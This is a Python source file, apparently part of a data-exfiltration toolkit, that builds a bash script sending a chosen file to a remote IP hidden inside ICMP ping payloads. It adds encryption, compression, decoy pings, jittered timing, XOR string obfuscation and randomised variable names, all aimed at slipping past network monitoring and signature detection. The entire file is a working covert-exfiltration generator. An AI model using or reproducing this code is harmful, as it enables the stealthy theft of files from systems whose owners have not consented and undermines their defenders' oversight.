import random

from ..obfuscation import xor_key, xor_encode


def _bash_payload(file_path, ip, period, random_delay, randomize=False, junk=0, randomize_junk=False, compress=False, encrypt=None, passphrase='', estimate=False, obfuscate_strings=False):
    bash_file = file_path.replace("'", "'\\''")

    template = '''F='__FILE__';IP='__IP__';P=__PERIOD__;RD=__RDELAY__
C=12;IB=3;R=5;T=2
hsh=$(sha256sum "$F" | cut -d' ' -f1)
hex=$(xxd -p "$F" | tr -d '\\n')
dsz=$((${#hex}/2))
tot=$(( (dsz + C - 1) / C ))
if [ $tot -gt $((1<<(8*IB))) ]; then echo '[-] File too large'; exit 1; fi
if [ "$RD" != "0" ]; then echo "[+] Sending '$F' ($dsz bytes) to '$IP' in $tot pings every ($P +- $RD) s"
elif [ "$P" != "0" ]; then echo "[+] Sending '$F' ($dsz bytes) to '$IP' in $tot pings every $P s"
else echo "[+] Sending '$F' ($dsz bytes) to '$IP' in $tot pings"; fi
if [ "$RD" != "0" ] && awk "BEGIN{exit(!($RD>$P))}"; then echo "[!] WARNING: random-delay ($RD s) > period ($P s)" >&2; fi
LS=0;t0=$(date +%s)
for((i=0;i<tot;i++)); do
idx=$(printf '%06x' $i)
chunk=${hex:$((i*24)):24}
pat=${idx}${chunk}
ok=0
for((a=0;a<R;a++)); do
if [ $LS -ne 0 ]; then
if [ "$RD" != "0" ]; then sl=$(awk "BEGIN{v=$P+($RANDOM/16383.5-1)*$RD;if(v<0)v=0;print v}");sleep "$sl"
elif [ "$P" != "0" ]; then sleep $P; fi; fi
LS=1
if ping -c 1 -W $T -s $((${#pat}/2)) -p "$pat" "$IP" >/dev/null 2>&1; then ok=1;break; fi
done
if [ $ok -eq 0 ]; then echo "[-] No reply for ping $i, transfer aborted"; exit 1; fi
s=$((i+1))
if [ "$P" != "0" ] || [ "$RD" != "0" ]; then
el=$(( $(date +%s) - t0 ))
eh=$((el/3600));em=$(( (el%3600)/60 ));es=$((el%60))
by=$((s*C));[ $by -gt $dsz ] && by=$dsz
pct=$((100*s/tot))
printf '\\r  %d/%d pings, %d/%d bytes, %d%%, elapsed %02d:%02d:%02d' $s $tot $by $dsz $pct $eh $em $es
if [ "$RD" = "0" ] && [ $s -gt 0 ]; then
rm=$((el*(tot-s)/s));rh=$((rm/3600));rmm=$(( (rm%3600)/60 ));rss=$((rm%60))
printf ', remaining ~%02d:%02d:%02d' $rh $rmm $rss; fi
elif [ $((s%100)) -eq 0 ]; then echo "  $s/$tot"; fi
done
echo ""
echo "=================================================="
echo "                     DONE"
echo "=================================================="
echo ""
echo "[*] SHA-256: $hsh"
'''

    script = template
    _xor_key = None
    if obfuscate_strings:
        _xor_key = xor_key()
        key_str = ' '.join(str(b) for b in _xor_key)
        decode_block = (
            f"_k=({key_str})\n"
            "_d(){ local h=\"$1\" r=\"\" i b; for((i=0;i<${#h};i+=2)); do b=$((16#${h:$i:2}^${_k[$((i/2%${#_k[@]}))]})); r+=$(printf \"\\\\$(printf '%03o' $b)\"); done; echo \"$r\"; }\n"
        )
        script = script.replace(
            "F='__FILE__';IP='__IP__'",
            decode_block + "F=$(_d '__XFILE__');IP=$(_d '__XIP__')"
        )
    if compress:
        script = script.replace(
            "hex=$(xxd -p \"$F\" | tr -d '\\n')\n",
            "osz=$(wc -c < \"$F\")\n"
            "hex=$(gzip -c \"$F\" | xxd -p | tr -d '\\n')\n"
            "csz=$((${#hex}/2))\n"
            "pct=$(awk -v c=$csz -v o=$osz 'BEGIN{printf \"%.1f\",100*c/o}')\n"
            "echo \"[*] Compressed: $osz -> $csz bytes (${pct}%)\"\n"
        )
    if encrypt:
        bash_pass = passphrase.replace("'", "'\\''")
        if obfuscate_strings:
            pass_expr = "\"pass:$(_d '__XPP__')\""
        else:
            pass_expr = "pass:'" + bash_pass + "'"
        if compress:
            script = script.replace(
                "dsz=$((${#hex}/2))\n",
                "hex=$(printf '%s' \"$hex\" | xxd -r -p | openssl enc -" + encrypt +
                " -pbkdf2 -iter 10000 -md sha256 -pass " + pass_expr + " | xxd -p | tr -d '\\n')\n"
                "echo \"[*] Encrypted with " + encrypt + "\"\n"
                "dsz=$((${#hex}/2))\n"
            )
        else:
            script = script.replace(
                "hex=$(xxd -p \"$F\" | tr -d '\\n')\n",
                "hex=$(openssl enc -" + encrypt + " -pbkdf2 -iter 10000 -md sha256 -pass " + pass_expr +
                " < \"$F\" | xxd -p | tr -d '\\n')\n"
                "echo \"[*] Encrypted with " + encrypt + "\"\n"
            )
    if junk > 0:
        script = script.replace('C=12;IB=3;R=5;T=2', f'C=12;IB=3;R=5;T=2;J={junk}')
        script = script.replace(
            "if [ $tot -gt $((1<<(8*IB))) ]",
            "if [ $tot -ge $((1<<(8*IB))) ]"
        )
        if randomize_junk:
            junk_line = "jd=ff$(dd if=/dev/urandom bs=14 count=1 2>/dev/null | xxd -p)\n"
        else:
            junk_line = "jd=ffffff$(dd if=/dev/urandom bs=12 count=1 2>/dev/null | xxd -p)\n"
        junk_code = (
            "for((j=0;j<J;j++)); do\n" +
            junk_line +
            "if [ $LS -ne 0 ]; then\n"
            "if [ \"$RD\" != \"0\" ]; then sl=$(awk \"BEGIN{v=$P+($RANDOM/16383.5-1)*$RD;if(v<0)v=0;print v}\");sleep \"$sl\"\n"
            "elif [ \"$P\" != \"0\" ]; then sleep $P; fi; fi\n"
            "LS=1\n"
            "ping -c 1 -W $T -s 15 -p \"$jd\" \"$IP\" >/dev/null 2>&1\n"
            "done\n"
        )
        script = script.replace("s=$((i+1))\n", "s=$((i+1))\n" + junk_code)
    if estimate:
        est_lines = (
            "echo \"[!] ESTIMATE OPTION ENABLED — the file will NOT be transferred\"\n"
            "echo \"[*] File size (after processing): $dsz bytes\"\n"
            "echo \"[*] Data pings: $tot\"\n"
        )
        if junk > 0:
            est_lines += (
                "echo \"[*] Junk pings: $((tot*J))\"\n"
                "echo \"[*] Total pings: $((tot*(1+J)))\"\n"
            )
        else:
            est_lines += "echo \"[*] Total pings: $tot\"\n"
        total_expr = "$((tot*(1+J)))" if junk > 0 else "$tot"
        est_lines += (
            "if [ \"$P\" != \"0\" ]; then\n"
            "et=$(awk -v t=" + total_expr + " -v p=$P 'BEGIN{s=t*p;h=int(s/3600);m=int((s%3600)/60);ss=int(s)%60;printf \"%02d:%02d:%02d\",h,m,ss}')\n"
            "echo \"[*] Estimated time: ~$et\"\n"
            "fi\n"
            "echo \"[*] SHA-256: $hsh\"\n"
            "exit 0\n"
        )
        script = script.replace("LS=0;t0=$(date +%s)\n", est_lines)

    if randomize:
        import re
        var_names = [
            'F', 'IP', 'P', 'RD',
            'C', 'IB', 'R', 'T',
            'hsh', 'hex', 'dsz', 'tot',
            'LS', 't0', 'i', 'idx', 'chunk', 'pat', 'ok',
            'a', 'sl', 's',
            'el', 'eh', 'em', 'es', 'by', 'pct',
            'rm', 'rh', 'rmm', 'rss',
        ]
        if compress:
            var_names.extend(['osz', 'csz'])
        if junk > 0:
            var_names.extend(['J', 'j', 'jd'])
        if estimate:
            var_names.append('et')
        if obfuscate_strings:
            var_names.extend(['_k', '_d'])
        letters = 'abcdefghijklmnopqrstuvwxyz'
        alphanums = letters + '0123456789'
        bash_reserved = {'for', 'let', 'set', 'env', 'pwd', 'awk', 'cut', 'sed'}
        original_names = set(var_names)
        used = set()
        mapping = {}
        for name in var_names:
            while True:
                rand_name = random.choice(letters) + ''.join(random.choices(alphanums, k=2))
                if rand_name not in used and rand_name not in bash_reserved and rand_name not in original_names:
                    used.add(rand_name)
                    mapping[name] = rand_name
                    break
        for old_name in sorted(var_names, key=len, reverse=True):
            if old_name == 's':
                pattern = r'(?<![-\\%])\bs\b'
            else:
                pattern = r'\b' + re.escape(old_name) + r'\b'
            script = re.sub(pattern, mapping[old_name], script)

    period_str = f"{period:g}"
    rdelay_str = f"{random_delay:g}"

    if obfuscate_strings:
        script = (script
                  .replace('__XFILE__', xor_encode(file_path, _xor_key))
                  .replace('__XIP__', xor_encode(ip, _xor_key)))
        if encrypt:
            script = script.replace('__XPP__', xor_encode(passphrase, _xor_key))
        return (script
                .replace('__PERIOD__', period_str)
                .replace('__RDELAY__', rdelay_str))

    return (script
            .replace('__FILE__', bash_file)
            .replace('__IP__', ip)
            .replace('__PERIOD__', period_str)
            .replace('__RDELAY__', rdelay_str))
